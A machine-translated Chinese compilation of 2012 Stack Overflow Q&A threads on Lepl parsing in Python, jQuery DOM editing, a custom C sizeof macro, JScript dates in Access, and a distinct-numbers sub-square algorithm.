你还应该看看`forwardTargetForSelector:`Ken Thomases 的参考资料。

* * *

您不必强制`sharedInstance`转换为`id`. 只需更改签名，因为您总是希望以这种方式使用它：

```
+ (id)sharedInstance; 
```

# python - 如何使用 Python Lepl 解析领域特定语言的子集？

> ID：10862987
> 
> 赞同：1
> 
> 时间：2012-06-02T14:15:45.127
> 
> 标签：python, parsing, lepl

我使用 Lepl 作为解析器，我正在解析的语言非常复杂，我只关心一小部分。我想不出办法让 Lepl 解析我关心的语法，然后只为其他所有内容返回字符串。如果我添加如下规则：

```
everything_else = ~newline & Regexp('.')[:] 
```

然后它被用来代替我关心的东西。我认为它正在发生，因为它比我的其他规则更长。Lepl 中是否有配置设置或其他东西，以便我可以拥有一个不完美的解析器？

**更新** 按要求添加一些细节。我只想解析出等于数字的顶级变量定义。那些依赖于他人或者是我想忽略的数学表达式。我还想忽略块定义中的内容我想忽略语言中的许多其他构造。所以这里有一个例子：

```
from lepl import *

class Variable(List): pass
import string

def parse_it(a_string):

    # Parser:  TODO: incomplete
    s = ~Space()[:] # zero or more spaces
    s1 = ~Space()[1:]  # 1 or more spaces
    newline = Newline() & s
    number_squote = ~Optional(Literal("'")) & s & Real() & s & ~Optional(Literal("'"))
    number_dquote = ~Optional(Literal('"')) & s & Real() & s & ~Optional(Literal('"'))
    number = number_squote | number_dquote | Real() >> float
    var_keyword = ~newline & ~Regexp(r'(?i)variable')
    var_name = Word() >> string.lower
    var_assignment = s1 & var_name & s & ~Literal('=') & s & number > Variable
    vars = var_keyword & var_assignment[1:]
    parser = vars[1:]
    return parser.parse(a_string)

input="""
VARIABLE abc=5 bbb='7' ddd='abc*bbb'
variable ccccc=7  // comment
block(1,2,3,4) of_type=cleaner abc=4 d=5 c=string('hi')

define_block block2 (3,4,5,6,7,a,b) var1=35 var2=36
variable ignore_this=5
block3(3,4,5,6) x='var1*ignore_this' y=var2
block4(4,5,6,7,a,b) x='var1*2' y="var2*3"
end_block

block2(1,2,3,4,5,6,3) abc=ccccc d=abc 

create_blocks  // comment: initialize memory
connect_blocks // connect blocks together
simulate // 

"""
for i in parse_it(input):
    print i 
```

所以我只真正关心`variable Word() = Real()`在块定义之外定义的文件中的信息。我想将其余部分保留为字符串，以便我可以构建 AST 并修改变量值，然后再次写出控制文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T22:15:37.090

所以，如果我理解正确，你想解析任何以“变量”（忽略大小写）开头并且不在块内的行。

我们需要担心的第一件事是我们需要了解多少我们想要跳过的位。例如，我们可以跳过 和 之间的所有内容`define_block`，`end_block`但是如果文本“end_block”恰好出现在某个字符串中怎么办？也许为了处理这种情况，我们还需要注意字符串？或评论？这些担忧是为什么通常不像您想象的那样简单地跳过文本 - 事实证明，要理解我们可以跳过的内容，我们实际上*需要*解析数据。

但也许在这种情况下我们没问题。看起来你既没有多行字符串也没有多行注释，`define_block`而且`end_block`总是出现在一行的开头。这给了我们足够的保证（我认为）能够删除块而不用担心字符串或注释（因为字符串或注释将以`//`或`"`或类似开头，因此会产生误导 `//define_block`或`"define_block"`不会在行首）。

我们可以在 lepl 之外做到这一点：

```
block = re.compile(r'^\s*define_block.*?^\s*end_block[^$]*', re.I | re.M | re.S)
input = block.sub('', input)
for line in input.split('\n'):
    if line.lower().startswith('variable'):
        print line 
```

或作为内部的正则表达式：

```
block = Regexp(r'(?ims)^\s*define_block.*?^\s*end_block[^$]*') 
```

所以你的最终解决方案将是一些东西

```
variable = ...
other_line = Regexp(r'^.*$')
parser = (variable | block | other_line)[:] 
```

希望有帮助。

最后，全面披露，我还应该指出我今天发布的[https://groups.google.com/group/lepl/browse_thread/thread/e305b5b559d93e9e （对不起）。](https://groups.google.com/group/lepl/browse_thread/thread/e305b5b559d93e9e)

# jquery - 需要从动态页面中删除内容

> ID：10862990
> 
> 赞同：0
> 
> 时间：2012-06-02T14:15:51.480
> 
> 标签：jquery, html

我需要移除 $300 ，知道吗？价格是动态的

```
<h3>
     $300.00 <br><span>$500.00</span> 
</h3> 
```

这是我的 jQuery 代码，我知道它的错误代码

```
$('.price>h3 ').contents().remove(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:21:50.653

```
$('h3').contents(':not(span)').remove(); 
```

**[演示](http://jsfiddle.net/thecodeparadox/fSXMg/1/)**

**或者**

```
$('.price > h3').text(function(index, text) {
   return text.replace(/300.00/,'').replace(/\$/,'');
}); 
```

**[演示](http://jsfiddle.net/thecodeparadox/xKhaq/2/)**

**或者**

```
$('.price > h3').html(function(index, text) {
   return $('span');
}); 
```

**[演示](http://jsfiddle.net/thecodeparadox/Jmbvx/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T14:22:06.777

如果你只想要跨度：

```
$('h3').html(function( i, old){
    return $(old).filter('span')
}) 
```

演示：http: [//jsfiddle.net/dr7CC/](http://jsfiddle.net/dr7CC/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-02T14:25:23.103

```
$(function(){
  var children = $('h3').children();
  $('h3').html('');
  $('h3').append(children);
}); 
```

# c - 实现自己的 sizeof

> ID：10862991
> 
> 赞同：7
> 
> 时间：2012-06-02T14:15:59.837
> 
> 标签：c

> **可能重复：**
> [不使用 sizeof 的数据类型的大小](https://stackoverflow.com/questions/1219199/size-of-a-datatype-without-using-sizeof)

我的一位朋友最近出现在 NVIDIA 采访中，他被邀请参加`implement his own sizeof in C`。我尝试做同样的练习并成功编写了两个不同的定义，`sizeof`其中一个可以处理变量，另一个可以处理数据类型，但我无法合并两者。有什么办法吗？`sizeof`此外，是否有可能在 C中实现一个完整的。

处理 类型`int`等`char`

```
#define my_sizeof(type) ((size_t)(((type *)0) + 1)) 
```

处理变量，如`x`

```
#define my_sizeof(var) (size_t)((char *)(&var+1)-(char*)(&var)) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:21:10.487

好问题

1.  我看不到将两者合并的方法。

2.  处理第二个的实现是不安全的

如果用户这样做怎么办

```
sizeof (*ptr)

sizeof (func()) 
```

# datetime - 如何将 jscript 日期存储到访问日期/时间字段中？

> ID：10862992
> 
> 赞同：2
> 
> 时间：2012-06-02T14:16:03.533
> 
> 标签：datetime, ms-access-2007, jscript

我一直在努力解决这个问题。我有一个带有 DATETIME 字段的 Microsoft Access 2007 数据库，我试图从 JScript Date 对象中填充该字段，即

```
rs("DTField").Value = new Date(); 
```

我原以为 JScript 和 Access 作为 Microsoft 工具都知道如何做到这一点，但我认为这似乎太多了。

我需要对等式的任一侧应用什么变换才能使这个值分配起作用？

*添加问题*：

换一种方式，从数据库到 JScript 怎么样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T20:13:21.343

使用该[`getVarDate`](http://msdn.microsoft.com/en-us/library/4d4x3w61%28VS.84%29.aspx)功能。从文档中：

> 当代码与 COM 对象、ActiveX 对象或其他接受和返回 VT_DATE 格式的日期值的对象交互时，使用 getVarDate 方法。其中包括 Visual Basic 和 Visual Basic Sc​​ripting Edition (VBScript) 中的对象。返回值的实际格式取决于区域设置。

```
rs("DTField").Value = (new Date()).getVarDate(); 
```

* * *

要回答您添加的问题，您需要显式创建一个`Date`对象。

```
var theDate = new Date(rs("DTField").Value); 
```

# algorithm - 具有大多数不同数字算法的子方

> ID：10862994
> 
> 赞同：4
> 
> 时间：2012-06-02T14:16:19.780
> 
> 标签：algorithm

我试图为以下问题发明一种有效的算法，但我认为我失败了。我得到了一个**n** * **n**的棋盘，里面有不同的数字和一个整数**k** (k <= n)。我必须在棋盘中找到一个正方形**k** * **k**，其中不同数字的数量最大。对于那些例子：

n=4 k=3
10 9 8 1
7 6 5 7
5 3 0 2
3 4 1 3

n=4 k=2
1 2 1 2
2 1 2 1
1 2 1 2
2 1 3 4

答案如下：

9 8 1
6 5 7
3 0 2

1 2
3 4

我对这个问题的解决方案（在 C++ 中）是基于选择左上角的第一个正方形 k*k，创建一个将数字（键）与其出现频率（值）联系起来的映射。然后，我通过删除地图中正方形的第一列并添加下一列，将正方形进一步移动一列。当我到达右侧时，我向下移动一排，然后向左移动到边界。然后向下一步，直接到边界。依此类推，直到我到达终点。答案基于特定时刻地图的最大尺寸。我认为这个解决方案的发明很糟糕（但可能仍然比蛮力更好），我很感激任何建议。这个问题可以以某种方式简化为修改后的最大矩形问题吗？( [http://www.drdobbs.com/database/184410529](http://www.drdobbs.com/database/184410529) )

根据 Daniele 的建议编辑（附加细节）

一开始我的算法分析了第一个 k*k 平方，即： 10 9 8 | 7 6 5 | 5 3 0\. 在分析每个元素时，它会将适当的数据写入地图。所以起初我有一对（10 -> 1）（数字10出现一次），然后我添加（9 -> 1），（8 -> 1），（7 -> 1），（6 -> 1）， （5 -> 1）。然后我遇到下一个 5，所以我将它的出现更改为两个 (5 -> 2)。最后我添加 (3 -> 1), (0 -> 1)。实际上我的地图包含 8 个元素（因为如上所述，5 个出现了两次）。我记得这个正方形坐标和地图的大小。我将我的 k*k 方格向右移动一列。因此，我减少了地图第一列中元素的出现。所以我删除对 (10 -> 1) 和 (7 -> 1) 并将 (5 -> 2) 更改为 (5 -> 1)。我添加了最后一列：(1 -> 1)、(7 -> 1) 和 (2 -> 1)（因为所有数字都是新的）。现在我注意到地图的大小比以前大（ 9 > 8 ），所以我将当前坐标保存在旧坐标之上。实际上我在这里结束我的算法（我的附加条件： if(map.size() == k*k) end; ）但否则我会“去”比左边低一排直到边界，这样我会已完成对所有可能的 k*k 方格的分析。

实际上，我正在寻找一种更好的时间消耗解决方案，因为我的解决方案被测试系统拒绝（我超过了时间限制）。我认为它比蛮力更好，因为我不会一一分析每个方块，但我可能错了。无论如何，它仍然不够好。

我可以附上 C++ 代码，以防你更容易，但我怀疑它会有所帮助。我只是在寻找算法建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-16T03:36:34.760

您的算法听起来不错，具有`O(n * n * k * log k)`时间复杂度和`O(k * k)`内存。如果您知道示例中的值是小整数，则可以`log k`通过将映射替换为数组来摆脱 。否则，实现算法的代码可能效率低下。尝试根据您的变化对代码进行计时`n`，并`k`查看时间是否按预期增长。

作为另一个可能的方向，您可以尝试动态编程风格的解决方案。定义函数`f(x, y, a, b)`以计算锚定于 的`a`x`b`矩形中的唯一值集（可能是位图） `(x, y)`。那么问题是找到 的最大值`|f(x, y, k, k)|`。被计算为 4 个或更多具有大约x维`f(x, y, a, b)`的较小矩形集的并集。如果缓存了较小的矩形集，则不必继续重新计算它们。缓存将占用大量内存，但您可以通过安排分解以使用 2 大小的幂来限制它。例如，`a/2``b/2`

```
 f(x, y, 21, 21) = f(x, y, 16, 16)
                    union f(x + 16, y, 4, 16)
                    union f(x + 20, y, 1, 16)
                    union f(x, y + 16, 16, 4)
                    union f(x, y + 20, 16, 1)
                    union f(x + 16, y + 16, 4, 4)
                    union f(x + 20, y + 16, 1, 4)
                    union f(x + 16, y + 20, 4, 1)
                    union f(x + 20, y + 20, 1, 1) 
```

我认为这种方法更像 O(n * n * log k * log k) ，因此只会为较大的值（`k`例如大于 1000）带来回报。